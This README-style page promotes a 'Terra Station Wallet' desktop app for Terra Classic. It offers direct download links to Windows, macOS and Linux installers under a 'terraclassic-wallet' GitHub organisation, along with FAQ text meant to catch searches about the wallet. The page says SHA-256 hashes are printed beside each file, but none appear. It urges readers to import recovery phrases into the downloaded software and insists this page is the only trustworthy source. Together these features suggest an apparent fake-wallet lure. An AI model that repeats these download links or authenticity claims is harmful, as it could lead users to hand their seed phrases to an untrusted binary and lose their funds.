![Terra Station Wallet](assets/banner-article.png)

# What Terra Station Wallet Is and Who Maintains It

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-5392F7?style=for-the-badge&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Download for Windows"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-5392F7?style=for-the-badge&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="Download for macOS"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-5392F7?style=for-the-badge&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`terra-station-wallet-windows-v2.5.13.exe`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-windows-v2.5.13.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | [`terra-station-wallet-macos-v2.5.13.dmg`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-macos-v2.5.13.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`terra-station-wallet-linux-v2.5.13.zip`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-linux-v2.5.13.zip) |

</div>

Every file in that table is attached to the [Terra Station Wallet release page](https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13), and the SHA-256 printed beside each name is the value published here.

> **Only download from this GitHub release page.** An installer offered anywhere else, however official it looks, is not a file this project published.

Terra Station Wallet is a self-custody desktop wallet for LUNC and USTC on Terra Classic. It runs on Windows, macOS and Linux, creates and stores keys on your own machine, and handles the everyday work of holding, sending and staking - with no account, no sign-up and no server holding your balance. It is maintained actively, and the current release is published on the GitHub releases page.

## What it is, in one paragraph

The wallet is software you install, not a service you log into. It creates a wallet or imports an existing one from a recovery phrase or private key, derives the Terra Classic addresses that wallet controls, and reads their balances from the chain. Everything that touches your funds - signing a send, delegating stake or claiming rewards - happens locally with keys that never leave the machine.

That design explains the features it does not have as clearly as the ones it does.

## What it does

| Task | How it works |
|---|---|
| Hold LUNC and USTC | Balances read from Terra Classic at your addresses |
| Send and receive | Signed locally, broadcast to the network |
| Stake | Delegate, undelegate and claim within the app |
| Import and restore | From a phrase, a key, or a Ledger device |
| Manage several wallets | Named wallets, switched in one place |

## What it is not

- **Not a custodial service.** No one holds your balance, and no one can freeze it.
- **Not an account system.** There is no email, password, sign-up or login (https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-login-no-account.md).
- **Not a recovery service.** A lost phrase is a lost wallet; nothing can rebuild it (*Recover a Terra Station Wallet with a Seed Phrase*).
- **Not affiliated with other products using the word "Station".** The name has been used by several projects over the years, and this wallet is its own product for Terra Classic.
- **Not a swap, NFT or burn platform.** Those are separate topics; the wallet's job is keys, balances and staking.

## What using it actually looks like

A typical session is short. You open the app, unlock it, see the balance read from the chain, and either do nothing or sign one transaction: a send, a delegation, a claim. Most days, the wallet is a window; the days that matter are the ones where you move something.

That shape is why the security model is built around a single secret rather than around a login. There is no session to hijack, no token to expire, no password to reset - just a local file, a phrase, and transactions you approve one at a time.

It also sets the expectation for support: anything that would need a server-side action is outside what the product can do, and any offer to perform one is either a misunderstanding or a scam.

## Who maintains it, and what that means for you

The wallet is actively maintained, and fixes ship in new releases rather than as advice to work around a problem. That matters practically in one way: an older installation is the most common cause of a wallet that misbehaves, so the supported state of the app is the current release.

Maintenance does not change the trust model. There is no support channel that can restore access, reverse a transfer or reset a password, because there is nothing server-side to reset. What the project can do is publish a build that works and fix reports in the next one - which is precisely what "maintained" means here.

## How it fits with Terra Classic

Terra Classic is the chain that carried on after the 2022 fork, with LUNC as its token and USTC as the legacy stablecoin renamed in place. Legacy balances appear automatically when a wallet is imported; nothing needs converting, swapping or bridging. https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-faq-answered.md explains the two chains if you are unsure which one holds your funds.

*Where to Download Terra Station Wallet* covers getting the current release, and https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/is-terra-station-wallet-safe.md covers what keeps it safe in use.

## The question behind "what happened to it"

People search for what happened to the wallet because the name has a long history and several products have used it. The useful answer is the present one: the wallet exists, it is maintained, it does what this page describes, and the current release is available from the project's releases page.

Any page that describes it as finished, replaced or unsafe is describing a different moment or a different product - and none of that changes what the software you download today does.

## Questions people ask

### Is Terra Station Wallet free?

Yes. The software is free, importing and restoring cost nothing, and the only costs are network fees paid to Terra Classic when you send, delegate or claim.

### Do I need to create an account?

No. There is no account. The first thing you do is create a wallet or import one, and from then on the phrase is the only credential that exists.

### Is it the same wallet as the old official one?

It is a wallet for the same chain, maintained as its own product. Whether an older installation is the same build is not the useful question - the current release is, and that is what you should be running.

### Does someone hold my keys so I can recover them?

No one does, by design. The phrase is the recovery method, and it is the only one. That is the trade for having no custodian who could lose, freeze or restrict your balance.

If you are evaluating it against something else, the useful comparison is not a feature list but a question: can the thing I am using sign a transaction without anyone else's permission, and can I leave with my phrase if I want to? This wallet answers yes to both, and that is the property worth comparing, ahead of any list of integrations. Anything that needs an operator to approve your transaction is a different product, whatever it happens to be called.
